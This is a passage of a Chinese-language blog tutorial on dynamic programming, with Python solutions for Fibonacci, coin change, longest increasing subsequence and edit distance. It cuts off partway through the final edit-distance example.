<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre>

<p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt loading="lazy"></p>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    prev <span class="token operator">=</span> <span class="token number">1</span>
    curr <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> prev <span class="token operator">+</span> curr
        prev <span class="token operator">=</span> curr
        curr <span class="token operator">=</span> num
    <span class="token keyword">return</span> curr</code></pre>

<p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p>
<h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p>
<p>状态转移方程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt loading="lazy"></p>
<h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 当n - coin = 0 的时候说明这条路走的通</span>
            <span class="token keyword">return</span> <span class="token number">0</span>
        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 当n - coin &lt; 0 的时候则说明这条路走不通</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>  <span class="token comment"># float("INF")为正无穷大，负无穷大则为float("-INF")</span>
        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>  <span class="token comment"># 递归列表</span>
            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>  <span class="token comment"># 取出一个值n就要减去那个值</span>
            <span class="token keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>  <span class="token comment"># 当main函数的返回值为-1的时候，这条路走不通，则挑出循环</span>
            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>  <span class="token comment"># 当到了树的最低下，上面的if语句没有执行跳出去，则使res=sub+1</span>
        <span class="token keyword">return</span> res <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span>  <span class="token comment"># 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数</span>

    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span>


<span class="token comment"># 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt loading="lazy"></p>
<h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> n <span class="token keyword">in</span> memo<span class="token punctuation">:</span>  <span class="token comment"># 查找备忘录，避免重复计算，就是计算以上颜色相同的部分</span>
            <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>
        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">0</span>
        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>
        res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>
            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>
            <span class="token keyword">if</span> sub <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> sub<span class="token punctuation">)</span>
        memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n<span class="token punctuation">]</span>

    <span class="token keyword">return</span> main<span class="token punctuation">(</span>amount<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>coinChange<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">-</span> coin <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> coin<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">if</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">else</span> dp<span class="token punctuation">[</span>a<span class="token punctuation">]</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>演示图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt loading="lazy"></p>
<p>借用大佬的一句话：</p>
<p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p>
<h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt loading="lazy"></p>
<h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p>
<p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt loading="lazy"></p>
<p>代码实现</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token number">0</span>
    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 定义每一位数的最长递增子序列</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 令每一位的初始值为1</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># dp[i]表示nums[i]这个数结尾的最长递增子序列的长度</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>可见时间复杂度为O(n^2)</p>
<h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p>
<p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt loading="lazy"></p>
<p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt loading="lazy"></p>
<p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>
    piles <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#定义最长递增子序列的长度</span>
    top <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 定义每一位数的最长递增子序列</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        top<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 令每一位的初始值为1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        poker <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        left <span class="token operator">=</span> <span class="token number">0</span>
        right <span class="token operator">=</span> piles
        <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> poker<span class="token punctuation">:</span>
                right <span class="token operator">=</span> mid
            <span class="token keyword">elif</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> poker<span class="token punctuation">:</span>
                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                right <span class="token operator">=</span> mid
        <span class="token keyword">if</span> left <span class="token operator">==</span> piles<span class="token punctuation">:</span>
            piles <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 最长递增子序列的长度加一</span>
        top<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> poker
    <span class="token keyword">return</span> piles

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt loading="lazy"></p>
<h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span>
        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 同上</span>

        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 若相等直接跳过进行下一个字符的判断</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 插入</span>
                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 替换</span>
                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 删除</span>

    <span class="token keyword">return</span> dp<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p>
<h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 备忘录</span>

    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>
            <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span>
        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 同上</span>

        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 若相等直接跳过进行下一个字符的判断</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 插入</span>
                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 替换</span>
                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 删除</span>
        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p>
<p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt loading="lazy"></p>
<p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt loading="lazy"></p>
<p>于是就可以写出以下代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>
    dp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
